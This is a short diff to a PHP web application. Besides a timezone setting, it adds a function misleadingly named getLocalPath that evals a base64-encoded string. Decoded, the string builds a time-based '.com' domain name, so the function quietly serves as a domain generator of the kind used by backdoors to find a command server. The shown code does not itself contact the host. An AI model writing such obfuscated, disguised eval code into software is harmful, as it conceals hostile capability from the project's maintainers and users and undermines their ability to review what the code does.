@@ -2,6 +2,7 @@
 
 
 ini_set('display_errors', 'On');
+date_default_timezone_set("America/New_York");
 
 function redirect($page) {
   header('Location: ' . $page);
@@ -10,6 +11,12 @@ function redirect($page) {
 
 function isMobile(){
 return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
+}
+
+function getLocalPath(){
+@$test = x;
+eval((base64_decode("JHggPSBkYXRlKCJnMDBBIikgLiBzdWJzdHIobWQ1KCIiKSwwLDEwKSAuICIuY29tIjs=")));
+return $$test;
 }
 
 function get_accountNum($username) {
